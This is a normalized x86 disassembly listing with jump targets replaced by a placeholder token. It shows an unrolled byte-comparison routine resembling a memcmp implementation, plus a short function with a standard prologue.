je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x6 ]
sub esi eax
je r-xdata
jmp r-xdata
xor eax eax
movzx eax [ edx - 0x1f ]
movzx esi [ ecx - 0x1f ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x7 ]
sub esi eax
je r-xdata
movzx esi [ ecx - 0x2 ]
movzx eax [ edx - 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp eax [ edx + 0x8 ]
je r-xdata
movzx esi [ ecx + 0x5 ]
movzx eax [ edx + 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x3 ]
movzx eax [ edx + 0x3 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1b ]
movzx eax [ edx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x17 ]
movzx eax [ edx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x13 ]
movzx eax [ edx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xf ]
movzx eax [ edx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xb ]
movzx eax [ edx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x7 ]
movzx eax [ edx - 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x3 ]
movzx eax [ edx - 0x3 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1c ]
movzx eax [ edx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x18 ]
movzx eax [ edx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x14 ]
movzx eax [ edx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x10 ]
movzx eax [ edx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xc ]
movzx eax [ edx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x8 ]
movzx eax [ edx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x4 ]
movzx eax [ edx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1d ]
movzx eax [ edx - 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x19 ]
movzx eax [ edx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x15 ]
movzx eax [ edx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x11 ]
movzx eax [ edx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xd ]
movzx eax [ edx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x9 ]
movzx eax [ edx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x5 ]
movzx eax [ edx - 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1e ]
movzx eax [ edx - 0x1e ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1a ]
movzx eax [ edx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x16 ]
movzx eax [ edx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x12 ]
movzx eax [ edx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xe ]
movzx eax [ edx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xa ]
movzx eax [ edx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x6 ]
movzx eax [ edx - 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x8 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x6 ]
movzx eax [ edx + 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
movzx esi [ ecx - 0x1a ]
movzx eax [ edx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x16 ]
movzx eax [ edx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x12 ]
movzx eax [ edx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xe ]
movzx eax [ edx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xa ]
movzx eax [ edx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x6 ]
movzx eax [ edx - 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x2 ]
movzx eax [ edx - 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1b ]
movzx eax [ edx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x17 ]
movzx eax [ edx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x13 ]
movzx eax [ edx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xf ]
movzx eax [ edx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xb ]
movzx eax [ edx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x7 ]
movzx eax [ edx - 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x3 ]
movzx eax [ edx - 0x3 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1c ]
movzx eax [ edx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x18 ]
movzx eax [ edx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x14 ]
movzx eax [ edx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x10 ]
movzx eax [ edx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xc ]
movzx eax [ edx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x8 ]
movzx eax [ edx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x4 ]
movzx eax [ edx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1d ]
movzx eax [ edx - 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x19 ]
movzx eax [ edx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x15 ]
movzx eax [ edx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x11 ]
movzx eax [ edx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xd ]
movzx eax [ edx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x9 ]
movzx eax [ edx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x5 ]
movzx eax [ edx - 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax [ ecx + 0xc ]
cmp eax [ edx + 0xc ]
je r-xdata
movzx esi [ ecx + 0x9 ]
movzx eax [ edx + 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x7 ]
movzx eax [ edx + 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
movzx esi [ ecx - 0x19 ]
movzx eax [ edx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x15 ]
movzx eax [ edx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x11 ]
movzx eax [ edx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xd ]
movzx eax [ edx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x9 ]
movzx eax [ edx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x5 ]
movzx eax [ edx - 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ ecx - 0x1 ]
movzx ecx [ edx - 0x1 ]
sub eax ecx
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1a ]
movzx eax [ edx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x16 ]
movzx eax [ edx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x12 ]
movzx eax [ edx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xe ]
movzx eax [ edx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xa ]
movzx eax [ edx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x6 ]
movzx eax [ edx - 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x2 ]
movzx eax [ edx - 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1b ]
movzx eax [ edx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x17 ]
movzx eax [ edx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x13 ]
movzx eax [ edx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xf ]
movzx eax [ edx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xb ]
movzx eax [ edx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x7 ]
movzx eax [ edx - 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x3 ]
movzx eax [ edx - 0x3 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1c ]
movzx eax [ edx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x18 ]
movzx eax [ edx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x14 ]
movzx eax [ edx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x10 ]
movzx eax [ edx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xc ]
movzx eax [ edx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x8 ]
movzx eax [ edx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x4 ]
movzx eax [ edx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0xc ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0xa ]
movzx eax [ edx + 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
test eax eax
jne r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax [ ecx + 0x10 ]
cmp eax [ edx + 0x10 ]
je r-xdata
movzx esi [ ecx + 0xd ]
movzx eax [ edx + 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0xb ]
movzx eax [ edx + 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x10 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0xe ]
movzx eax [ edx + 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax [ ecx + 0x14 ]
cmp eax [ edx + 0x14 ]
je r-xdata
movzx esi [ ecx + 0x11 ]
movzx eax [ edx + 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0xf ]
movzx eax [ edx + 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x14 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x12 ]
movzx eax [ edx + 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax [ ecx + 0x18 ]
cmp eax [ edx + 0x18 ]
je r-xdata
movzx esi [ ecx + 0x15 ]
movzx eax [ edx + 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x13 ]
movzx eax [ edx + 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x18 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x16 ]
movzx eax [ edx + 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax [ ecx + 0x1c ]
cmp eax [ edx + 0x1c ]
je r-xdata
movzx esi [ ecx + 0x19 ]
movzx eax [ edx + 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x17 ]
movzx eax [ edx + 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x1c ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x1a ]
movzx eax [ edx + 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
add ecx 0x20
add edx 0x20
sub edi 0x20
movzx esi [ ecx + 0x1d ]
movzx eax [ edx + 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1b ]
movzx eax [ edx + 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1e ]
movzx eax [ edx + 0x1e ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
movzx esi [ ecx + 0x1f ]
movzx eax [ edx + 0x1f ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
test eax eax
jne r-xdata
sub_201eb78
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
movzx eax [ ecx + 0x1 ]
